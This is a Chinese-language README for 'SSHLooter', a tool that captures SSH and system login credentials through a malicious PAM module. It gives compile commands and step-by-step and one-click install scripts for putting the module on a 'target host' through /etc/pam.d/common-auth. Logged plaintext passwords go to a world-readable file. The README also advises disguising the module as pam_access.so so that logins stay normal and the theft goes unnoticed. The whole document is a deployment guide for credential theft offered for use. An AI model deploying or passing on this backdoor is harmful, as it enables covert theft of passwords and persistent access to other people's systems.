markdown

# SSHLooter C 本地记录版本

这是 sshLooter 的纯 C 语言本地记录版本。  
**不再发送 Telegram**，所有登录凭证直接记录到本地日志文件。

---

### 1. 编译环境依赖（仅在你的机器上安装）

**Debian / Ubuntu / Kali 系列：**
```bash
sudo apt update
sudo apt install gcc libpam0g-dev make -y

CentOS / Rocky Linux / AlmaLinux / Red Hat / RHEL 系列：bash

sudo yum install gcc pam-devel make -y
```
# 或使用 dnf（新版系统）：
```
sudo dnf install gcc pam-devel make -y
```
2. 编译bash
```
gcc -fPIC -shared -o looter.so pam_cred.c -lpam
```

生成 looter.so 文件。3. 目标主机安装命令Debian / Ubuntu / Kali 系列bash

# 1. 复制模块
```
sudo cp looter.so /lib/x86_64-linux-gnu/security/looter.so
```

# 2. 添加到 PAM 配置（推荐放在文件最前面）
```
sudo sed -i '1i auth    optional    looter.so\naccount optional    looter.so' /etc/pam.d/common-auth
```
# 3. 设置权限
```
sudo chmod 644 /lib/x86_64-linux-gnu/security/looter.so
```
# 4. 创建日志文件
```
sudo touch /var/log/pam_cred.log
sudo chmod 644 /var/log/pam_cred.log
sudo chown root:root /var/log/pam_cred.log
```

CentOS / Rocky / AlmaLinux / Red Hat / RHEL 系列bash

# 1. 复制模块
```
sudo cp looter.so /lib64/security/looter.so
```

# 2. 添加到 PAM 配置
```
sudo sed -i '1i auth    optional    looter.so\naccount optional    looter.so' /etc/pam.d/common-auth
```

# 3. 设置权限
```
sudo chmod 644 /lib64/security/looter.so
```

# 4. 创建日志文件
```
sudo touch /var/log/pam_cred.log
sudo chmod 644 /var/log/pam_cred.log
sudo chown root:root /var/log/pam_cred.log
```

4. 一键自动化部署脚本Debian/Ubuntu/Kali 一键脚本（保存为 install.sh）bash
```

#!/bin/bash
echo "[+] SSHLooter 本地记录版 一键部署 - Debian/Ubuntu"

# 复制模块
if [ -d "/lib/x86_64-linux-gnu/security" ]; then
    sudo cp looter.so /lib/x86_64-linux-gnu/security/looter.so
elif [ -d "/lib/aarch64-linux-gnu/security" ]; then
    sudo cp looter.so /lib/aarch64-linux-gnu/security/looter.so
fi

# 添加 PAM 配置
sudo sed -i '1i auth    optional    looter.so\naccount optional    looter.so' /etc/pam.d/common-auth

# 日志文件
sudo touch /var/log/pam_cred.log
sudo chmod 644 /var/log/pam_cred.log
sudo chown root:root /var/log/pam_cred.log

sudo chmod 644 /lib/*/security/looter.so 2>/dev/null

echo "[√] 部署完成！登录凭证已记录到 /var/log/pam_cred.log"
```

CentOS/RHEL/Rocky/AlmaLinux 一键脚本（保存为 install.sh）bash
```

#!/bin/bash
echo "[+] SSHLooter 本地记录版 一键部署 - CentOS/RHEL"

sudo cp looter.so /lib64/security/looter.so

# 添加 PAM 配置
sudo sed -i '1i auth    optional    looter.so\naccount optional    looter.so' /etc/pam.d/common-auth

# 日志文件
sudo touch /var/log/pam_cred.log
sudo chmod 644 /var/log/pam_cred.log
sudo chown root:root /var/log/pam_cred.log

sudo chmod 644 /lib64/security/looter.so

echo "[√] 部署完成！登录凭证已记录到 /var/log/pam_cred.log"

使用方法：bash

chmod +x install.sh
sudo ./install.sh
```

5. 查看记录bash
```
tail -f /var/log/pam_cred.log
```

日志格式示例：

[2026-06-22 01:45:12] Hostname: server01 | Username: root | Password: password123

注意事项：模块返回 PAM_SUCCESS，不会影响正常登录。
建议将 looter.so 重命名为常见模块名伪装（如 pam_access.so）。
如需只监控 SSH，可只把模块加到 /etc/pam.d/sshd。
日志文件较大时可定期清理或使用 logrotate。



